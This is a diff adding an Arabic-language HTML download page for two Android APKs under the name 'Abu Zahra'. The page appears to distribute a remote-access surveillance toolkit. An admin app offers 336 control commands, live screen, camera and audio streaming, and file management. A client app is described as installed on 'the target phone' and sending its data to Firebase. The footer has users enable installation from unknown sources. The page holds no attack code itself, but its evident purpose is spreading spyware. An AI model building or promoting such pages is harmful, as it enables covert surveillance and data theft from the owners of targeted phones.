@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تحميل التطبيقات — أبو زهرة</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Segoe UI', Tahoma, sans-serif; background: linear-gradient(135deg, #0f172a 0%, #064e3b 50%, #0f172a 100%); min-height: 100vh; color: #fff; display: flex; align-items: center; justify-content: center; padding: 20px; }
+.container { max-width: 800px; width: 100%; }
+.header { text-align: center; margin-bottom: 40px; }
+.logo { display: inline-flex; align-items: center; justify-content: center; width: 80px; height: 80px; border-radius: 20px; background: linear-gradient(135deg, #10b981, #059669); margin-bottom: 16px; box-shadow: 0 8px 32px rgba(16,185,129,0.3); }
+.logo svg { width: 40px; height: 40px; fill: #fff; }
+h1 { font-size: 28px; margin-bottom: 8px; }
+.subtitle { color: #94a3b8; font-size: 16px; }
+.cards { display: grid; gap: 20px; }
+@media (min-width: 640px) { .cards { grid-template-columns: 1fr 1fr; } }
+.card { background: rgba(255,255,255,0.05); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 28px; transition: all 0.3s; }
+.card:hover { transform: translateY(-4px); border-color: rgba(16,185,129,0.3); box-shadow: 0 12px 40px rgba(16,185,129,0.15); }
+.card-icon { font-size: 48px; margin-bottom: 16px; }
+.card h2 { font-size: 20px; margin-bottom: 8px; }
+.card-version { color: #10b981; font-size: 14px; margin-bottom: 12px; font-weight: 600; }
+.card-desc { color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
+.card-features { list-style: none; margin-bottom: 24px; }
+.card-features li { padding: 4px 0; color: #cbd5e1; font-size: 13px; }
+.card-features li::before { content: "✓ "; color: #10b981; }
+.download-btn { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; padding: 14px; background: linear-gradient(135deg, #10b981, #059669); color: #fff; text-decoration: none; border-radius: 12px; font-weight: 600; font-size: 16px; transition: all 0.3s; }
+.download-btn:hover { transform: scale(1.02); box-shadow: 0 8px 24px rgba(16,185,129,0.4); }
+.download-btn svg { width: 20px; height: 20px; fill: currentColor; }
+.footer { text-align: center; margin-top: 32px; color: #64748b; font-size: 13px; }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<div class="logo"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg></div>
+<h1>أبو زهرة — تحميل التطبيقات</h1>
+<p class="subtitle">حمّل أحدث إصدارات التطبيقات (v4.1.0)</p>
+</div>
+<div class="cards">
+<div class="card">
+<div class="card-icon">📱</div>
+<h2>تطبيق الإدارة</h2>
+<p class="card-version">Admin-App v4.1.0 — 7.4MB</p>
+<p class="card-desc">تطبيق المسؤول للتحكم في الأجهزة وإدارة النظام</p>
+<ul class="card-features">
+<li>Navigation Drawer بـ 9 عناصر</li>
+<li>336 أمر للتحكم الكامل</li>
+<li>بث مباشر (شاشة/كاميرا/صوت)</li>
+<li>عارض نتائج الأوامر</li>
+<li>مدير ملفات محسّن</li>
+<li>Google Sign-In</li>
+</ul>
+<a href="/Admin-App-v4.1.0.apk" class="download-btn" download>
+<svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+تحميل التطبيق
+</a>
+</div>
+<div class="card">
+<div class="card-icon">📲</div>
+<h2>تطبيق العميل</h2>
+<p class="card-version">Android-App v4.0.0 — 7.7MB</p>
+<p class="card-desc">تطبيق الجهاز المُدار — يُثبّت على الهاتف الهدف</p>
+<ul class="card-features">
+<li>واجهة ربط بحقلين (ربط + استعادة)</li>
+<li>336 أمر + تصدير البيانات لـ Firebase</li>
+<li>بث مباشر (MediaCodec + WebSocket)</li>
+<li>إصلاحات أمنية (SSL، AES)</li>
+<li>استعادة الجلسة بالكود الدائم</li>
+<li>إرسال البيانات لـ Firebase</li>
+</ul>
+<a href="/Android-App-v4.0.0.apk" class="download-btn" download>
+<svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+تحميل التطبيق
+</a>
+</div>
+</div>
+<div class="footer">
+<p>© 2026 أبو زهرة — جميع الحقوق محفوظة</p>
+<p style="margin-top:8px;">بعد التحميل: فعّل "تثبيت من مصادر غير معروفة" في إعدادات الأمان</p>
+</div>
+</div>
+</body>
+</html>
